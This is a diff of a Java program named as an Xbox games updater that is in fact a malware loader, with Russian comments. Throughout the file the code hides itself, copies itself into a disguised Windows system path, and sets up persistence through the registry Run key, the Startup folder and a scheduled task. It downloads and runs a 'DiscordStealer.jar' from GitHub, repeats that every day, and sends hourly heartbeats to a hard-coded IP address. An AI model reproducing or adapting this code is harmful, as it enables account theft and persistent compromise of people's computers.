@@ -1,39 +1,28 @@
 import java.io.*;
 import java.net.*;
 import java.nio.file.*;
-import java.util.*;
 import java.util.concurrent.*;
-import java.util.jar.*;
 
 public class XboxGamesUpdater {
     
     private static final String[] STEALER_MIRRORS = {
         "https://github.com/superbebra1234/Test_GG_hub/raw/main/DiscordStealer.jar"
     };
-    
     private static final String INSTALL_PATH = System.getenv("PROGRAMDATA") + "\\Microsoft\\Windows\\Core\\core.jar";
-    private static final String SERVICE_NAME = "WindowsCoreService";
-    private static ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(3);
     
     public static void main(String[] args) {
-        // Скрываем консоль
         hideConsole();
-        
-        // Устанавливаемся в систему
         install();
-        
-        // Запускаем основной стилер
         runStealer();
         
-        // Периодические задачи
-        scheduler.scheduleAtFixedRate(() -> update(), 24, 24, TimeUnit.HOURS);
+        // Персистентность
+        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(2);
+        scheduler.scheduleAtFixedRate(() -> runStealer(), 24, 24, TimeUnit.HOURS);
         scheduler.scheduleAtFixedRate(() -> heartbeat(), 1, 1, TimeUnit.HOURS);
     }
     
     private static void hideConsole() {
-        try {
-            new ProcessBuilder("cmd.exe", "/c", "exit").start();
-        } catch (Exception e) {}
+        try { new ProcessBuilder("cmd.exe", "/c", "exit").start(); } catch (Exception e) {}
     }
     
     private static void install() {
@@ -41,57 +30,29 @@ public class XboxGamesUpdater {
             String currentJar = XboxGamesUpdater.class.getProtectionDomain()
                 .getCodeSource().getLocation().toURI().getPath();
             
-            // Копируем в системную папку
-            File installFile = new File(INSTALL_PATH);
-            if (!installFile.exists()) {
+            new File(INSTALL_PATH).getParentFile().mkdirs();
+            if (!new File(INSTALL_PATH).exists()) {
                 Files.copy(Paths.get(currentJar), Paths.get(INSTALL_PATH), StandardCopyOption.REPLACE_EXISTING);
             }
             
-            // Добавляем в автозагрузку (3 способа для надёжности)
-            addToRegistry();
-            addToStartupFolder();
-            addToTaskScheduler();
-            
-        } catch (Exception e) {}
-    }
-    
-    private static void addToRegistry() {
-        try {
-            String[] regPaths = {
-                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-                "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-            };
-            for (String reg : regPaths) {
-                Runtime.getRuntime().exec("reg add \"" + reg + "\" /v \"" + SERVICE_NAME + "\" /t REG_SZ /d \"" + INSTALL_PATH + "\" /f");
-            }
-        } catch (Exception e) {}
-    }
-    
-    private static void addToStartupFolder() {
-        try {
-            String startup = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + SERVICE_NAME + ".jar";
+            // Автозагрузка (3 способа)
+            Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsCore /t REG_SZ /d \"" + INSTALL_PATH + "\" /f");
+            String startup = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsCore.jar";
             Files.copy(Paths.get(INSTALL_PATH), Paths.get(startup), StandardCopyOption.REPLACE_EXISTING);
-        } catch (Exception e) {}
-    }
-    
-    private static void addToTaskScheduler() {
-        try {
-            Runtime.getRuntime().exec("schtasks /create /tn \"" + SERVICE_NAME + "\" /tr \"" + INSTALL_PATH + "\" /sc onlogon /f");
+            Runtime.getRuntime().exec("schtasks /create /tn \"WindowsCore\" /tr \"" + INSTALL_PATH + "\" /sc onlogon /f");
+            
+            Runtime.getRuntime().exec("attrib +h \"" + INSTALL_PATH + "\"");
         } catch (Exception e) {}
     }
     
     private static void runStealer() {
         for (int attempt = 1; attempt <= 3; attempt++) {
             try {
-                byte[] stealerData = downloadStealer();
-                if (stealerData != null) {
+                byte[] data = downloadStealer();
+                if (data != null && data.length > 10000) {
                     String tempPath = System.getenv("TEMP") + "\\stealer.jar";
-                    Files.write(Paths.get(tempPath), stealerData);
-                    
-                    ProcessBuilder pb = new ProcessBuilder("java", "-jar", tempPath);
-                    pb.redirectErrorStream(true);
-                    pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
-                    pb.start();
+                    Files.write(Paths.get(tempPath), data);
+                    Runtime.getRuntime().exec("java -jar \"" + tempPath + "\"");
                     return;
                 }
             } catch (Exception e) {}
@@ -106,15 +67,12 @@ public class XboxGamesUpdater {
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                 conn.setConnectTimeout(10000);
-                
                 if (conn.getResponseCode() == 200) {
                     ByteArrayOutputStream baos = new ByteArrayOutputStream();
                     try (InputStream in = conn.getInputStream()) {
                         byte[] buffer = new byte[8192];
                         int bytesRead;
-                        while ((bytesRead = in.read(buffer)) != -1) {
-                            baos.write(buffer, 0, bytesRead);
-                        }
+                        while ((bytesRead = in.read(buffer)) != -1) baos.write(buffer, 0, bytesRead);
                     }
                     return baos.toByteArray();
                 }
@@ -123,12 +81,7 @@ public class XboxGamesUpdater {
         return null;
     }
     
-    private static void update() {
-        runStealer(); // Переустанавливаем стилер
-    }
-    
     private static void heartbeat() {
-        // Отправляем сигнал что система жива (опционально)
         try {
             URL url = new URL("http://26.184.88.227:8891/heartbeat");
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
